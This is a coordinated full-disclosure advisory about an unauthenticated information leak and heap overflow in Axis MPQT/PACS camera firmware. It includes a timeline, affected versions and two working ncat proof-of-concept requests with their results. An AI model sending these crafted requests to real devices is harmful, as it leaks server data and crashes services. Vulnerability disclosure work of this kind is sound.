@@ -1,0 +1,89 @@
+[STX]
+
+Subject: Axis Communications MPQT/PACS Heap Overflow and Information Leakage.
+
+Attack vector: Remote
+Authentication: Anonymous (no credentials needed)
+Researcher: bashis <mcw noemail eu> (August 2017)
+PoC: https://github.com/mcw0/PoC
+Release date: December 1, 2017
+Full Disclosure: 90 days (due to the large volume of affected devices)
+
+heap: Non-Executable + ASLR
+stack: Non-Executable + ASLR
+
+Axis Vulnerability ID: ACV-120444
+
+Vulnerable: MPQT series < v7.20.x/6.50.1.2
+Not vulnerable: MPQT series > v7.30/6.50.1.3 (Releases from September to November 2017)
+
+Vulnerable: PACS series < v1.30.0.2/1.60.0/1.10.0.2/1.65.1
+Not vulnerable (Releases from October to November 2017):
+
+1. Information leak; All MPQT and PACS (Exist actually from v4.x Firmware)
+2. Heap Overflow; MPQT and PACS with Apache Web Server (cannot be triggered with Boa Web Server)
+
+[Note]
+The best way to find a fixed FW is to check the Axis advisory and look for 'ACV-120444' in the release notes.
+https://www.axis.com/global/en/support/firmware
+https://www.axis.com/global/en/support/product-security
+
+
+Timeline:
+August 31, 2017: Initiated contact with Axis
+September 1, 2017: Response from Axis
+September 5, 2017: ACK of findings from Axis
+September 9, 2017: Received first test image from Axis to verify fix
+September 28, 2017: Received first advisory draft from Axis
+November 15-27, 2017: Coordination with Axis for Full Disclosure
+December 1, 2017: Full Disclosure
+
+-[General Information]-
+"CGI_decode" in /usr/lib/libcgiparser.so suffers from a bug in the handling URL decode of '%xx'.
+The CGI_decode does not check the size of what it is about to decode, it always assumes "%" plus two chars.
+
+By supplying only one single '%', 'CGI_decode' will try to URL decode [% + NULL + Next char], which lead to the return of a longer string than expected as the new string will be read until the next NULL. ([NULL string termination + Next char] are replaced with one '?')
+
+-[Information leakage]-
+
+The "%"" in "GET /index.shtml?size=%"" triggers both "information disclosure" and "heap overflow", depending on how it will be used.
+
+[PoC] (see the breakpoint with the 'AAAA' in the 'Result')
+$ echo -en "GET /index.shtml?size=AAAA% HTTP/1.0\n\n" | ncat -v 192.168.57.20 80
+
+[Result]
+...
+      var completePath = "imagepath=" + encodeURIComponent(imagepath) + "&size=AAAA?http_user=anonymous&http_remote_addr=192.168.57.1&http_remote_port=44019&http_port=80&http_scheme_addr=http://http&http_protocol=http&www_authenticate_header=WWW-Authenticate:%20Digest%20realm=%22_%22,%20nonce=%22pP/WaqNeBQA=884e58ea2563f69a14215a33ca02efa68eeca126%22,%20algorithm=MD5,%20qop=%22auth%22";
+...
+
+
+-[Heap Overflow]-
+
+To trigger the heap overflow we need to send ~20KB amount of data that would normally not be accepted by the Web server.
+The way around this is to use 'Referer:' and 'x-sessioncookie', where we can send max 8162 bytes in each of them.
+
+[Note]
+Without the information leakage bug above, the realloc() will never be triggered regardless how much data is sent.
+
+[PoC]
+$ echo -en "GET /index.shtml?size=% HTTP/1.0\nReferer: `for((i=0;i<8162;i++));do echo -en "\x22";done`\nx-sessioncookie: `for((i=0;i<2157;i++));do echo -en "\x22";done`\n\n" | ncat -v 192.168.57.20 80
+
+[Result]
+/var/log/info.log
+2017-05-08T08:22:23.801+00:00 axis [ INFO    ] ssid[3337]: *** Error in `/bin/ssid': realloc(): invalid next size: 0x00bfda50 ***
+
+-[Vulnerable binaries]-
+
+/bin/ssid (Server Side Include Daemon)
+/bin/urldecode (URL Command Line Tool)
+/usr/bin/dynamic_overlayd (Dynamic Overlay Daemon)
+/usr/bin/wsd (Web Service Dispatch Daemon)
+/usr/html/axis-cgi/param.cgi (VAPIX Parameter Management)
+
+/usr/lib/libwsevent.so
+/usr/lib/libcgiparser.so (<= with the vulnerable function 'CGI_decode()', used in above binaries)
+
+Have a nice day
+/bashis
+
+[ETX]
